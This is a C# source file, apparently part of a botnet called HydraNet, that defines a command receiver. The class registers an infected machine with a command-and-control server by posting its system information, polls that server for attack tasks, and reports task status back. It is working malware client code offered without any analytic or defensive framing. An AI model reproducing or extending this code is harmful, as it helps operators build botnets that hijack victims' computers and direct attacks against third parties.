namespace HydraNet.Core;

using System.Net.Http.Json;
using HydraNet.Models;

public sealed class CommandReceiver
{
    private readonly HttpClient _client;
    private readonly string _botId;

    public CommandReceiver(string c2Url, string botId)
    {
        _botId = botId;
        _client = new HttpClient
        {
            BaseAddress = new Uri(c2Url),
            Timeout = TimeSpan.FromSeconds(30)
        };
    }

    public async Task RegisterAsync(Dictionary<string, string> systemInfo)
    {
        var content = JsonContent.Create(systemInfo);
        await _client.PostAsync($"/api/bots/{_botId}/register", content);
    }

    public async Task<AttackTask?> PollAsync(CancellationToken ct)
    {
        try
        {
            var response = await _client.GetAsync($"/api/bots/{_botId}/task", ct);
            if (response.IsSuccessStatusCode)
            {
                return await response.Content.ReadFromJsonAsync<AttackTask>(ct);
            }
        }
        catch (TaskCanceledException)
        {
        }
        catch (HttpRequestException)
        {
        }
        return null;
    }

    public async Task ReportStatusAsync(string taskId, string status)
    {
        var payload = new { task_id = taskId, status, timestamp = DateTime.UtcNow };
        await _client.PostAsJsonAsync($"/api/bots/{_botId}/status", payload);
    }
}
